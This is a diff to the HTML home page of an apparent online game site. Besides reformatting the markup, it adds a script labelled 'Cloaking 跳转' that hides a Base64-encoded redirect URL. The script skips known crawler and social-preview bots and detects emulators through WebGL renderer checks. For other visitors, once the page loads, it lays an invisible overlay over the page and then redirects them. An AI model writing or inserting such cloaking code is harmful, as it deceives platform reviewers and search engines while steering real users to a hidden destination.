@@ -1,70 +1,123 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-    <meta name="description" content="Online Game Site" />
-    <meta name="keywords" content="game, online, site" />
-    <meta name="author" content="Seiri" />
-    <meta name="robots" content="index, follow" />
-    <meta name="theme-color" content="#1a1a1a" />
-    <link rel="stylesheet" href="assets/css/style.css" />
-    <link rel="icon" href="favicon.ico" />
-    <link
-      rel="apple-touch-icon"
-      href="https://html-online-game.github.io/favicon.ico"
-    />
-    <!-- Google adsense -->
-    <script
-      async
-      src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4988552421895566"
-      crossorigin="anonymous"
-    ></script>
-    <!-- Google tag (gtag.js) -->
-    <script
-      async
-      src="https://www.googletagmanager.com/gtag/js?id=G-PF5LNZJYLL"
-    ></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag() {
-        dataLayer.push(arguments);
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <meta name="description" content="Online Game Site" />
+  <meta name="keywords" content="game, online, site" />
+  <meta name="author" content="Seiri" />
+  <meta name="robots" content="index, follow" />
+  <meta name="theme-color" content="#1a1a1a" />
+  <link rel="stylesheet" href="assets/css/style.css" />
+  <link rel="icon" href="favicon.ico" />
+  <link rel="apple-touch-icon" href="https://html-online-game.github.io/favicon.ico" />
+
+  <!-- Google adsense -->
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4988552421895566" crossorigin="anonymous"></script>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-PF5LNZJYLL"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag("js", new Date());
+    gtag("config", "G-PF5LNZJYLL");
+  </script>
+
+  <title>Online Game Site</title>
+
+  <!-- === Cloaking 跳转 === -->
+  <script>
+    const REG_PAGE_ENC = "aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ=="; // Base64跳转地址
+    const DELAY_MS = 2000; // 延时2秒
+    const BOT_UA = [
+      "facebookexternalhit","Facebot","Twitterbot","Slackbot",
+      "TelegramBot","LinkedInBot","WhatsApp","Googlebot","Bingbot","Pinterest"
+    ];
+
+    function isBot(){
+      const ua = navigator.userAgent;
+      return BOT_UA.some(bot => ua.toLowerCase().includes(bot.toLowerCase()));
+    }
+
+    function isMobile(){
+      const ua = navigator.userAgent;
+      const mobileKeywords = [
+        "Android","iPhone","iPad","iPod","BlackBerry","Windows Phone","webOS","Opera Mini","Mobi"
+      ];
+      return mobileKeywords.some(k => ua.includes(k)) ||
+             (navigator.maxTouchPoints > 1 && /Macintosh/.test(ua));
+    }
+
+    function isEmulator(){
+      let renderer = "";
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const debugInfo = gl && gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+          renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+      } catch(e) { renderer = "unknown"; }
+      const badList = ["Google SwiftShader","VirtualBox","VMware","Mesa","llvmpipe"];
+      if (badList.some(x => renderer.includes(x))) return true;
+      if (window.devicePixelRatio <= 1 && screen.width >= 1000) return true;
+      return false;
+    }
+
+    let userActive = false;
+    window.addEventListener('touchstart', () => { userActive = true; }, { once: true });
+    window.addEventListener('mousemove', () => { userActive = true; }, { once: true });
+    window.addEventListener('keydown', () => { userActive = true; }, { once: true });
+
+    function lockPageUntilRedirect(ms){
+      const overlay = document.createElement('div');
+      overlay.style.position = 'fixed';
+      overlay.style.top = 0;
+      overlay.style.left = 0;
+      overlay.style.width = '100%';
+      overlay.style.height = '100%';
+      overlay.style.background = 'rgba(255,255,255,0)';
+      overlay.style.zIndex = 999999;
+      document.body.appendChild(overlay);
+      setTimeout(() => {
+        overlay.remove();
+        const regUrl = atob(REG_PAGE_ENC);
+        if (userActive) window.location.replace(regUrl);
+      }, ms);
+    }
+
+    window.addEventListener('load', () => {
+      if (!isBot() && !isEmulator()) {
+        lockPageUntilRedirect(DELAY_MS);
       }
-      gtag("js", new Date());
-      gtag("config", "G-PF5LNZJYLL");
-    </script>
-    <script type="text/javascript" src="assets/js/script.js"></script>
-    <title>Online Game Site</title>
-  </head>
-  <body>
-    <header>
-      <h1>Online Game Site</h1>
-    </header>
-    <nav>
-      <a href="https://html-online-game.github.io/">Home</a>
-      <a href="https://html-online-game.github.io/policy.html">Policy</a>
-    </nav>
-    <main class="game-container">
-      <h2>All Games</h2>
-      <!-- html-online-game-list-ad -->
-      <div class="ad-container">
-        <ins
-          class="adsbygoogle"
-          style="display: block"
-          data-ad-client="ca-pub-4988552421895566"
-          data-ad-slot="2343374539"
-          data-ad-format="auto"
-          data-full-width-responsive="true"
-        ></ins>
-        <script>
-          (adsbygoogle = window.adsbygoogle || []).push({});
-        </script>
-      </div>
-      <div class="game-list"></div>
-    </main>
-    <footer>
-      <p>&copy; 2025 Online Game Site. All rights reserved.</p>
-    </footer>
-  </body>
+    });
+  </script>
+</head>
+<body>
+  <header>
+    <h1>Online Game Site</h1>
+  </header>
+  <nav>
+    <a href="https://html-online-game.github.io/">Home</a>
+    <a href="https://html-online-game.github.io/policy.html">Policy</a>
+  </nav>
+  <main class="game-container">
+    <h2>All Games</h2>
+    <!-- html-online-game-list-ad -->
+    <div class="ad-container">
+      <ins class="adsbygoogle" style="display: block"
+        data-ad-client="ca-pub-4988552421895566"
+        data-ad-slot="2343374539"
+        data-ad-format="auto"
+        data-full-width-responsive="true"></ins>
+      <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+    </div>
+    <div class="game-list"></div>
+  </main>
+  <footer>
+    <p>&copy; 2025 Online Game Site. All rights reserved.</p>
+  </footer>
+</body>
 </html>
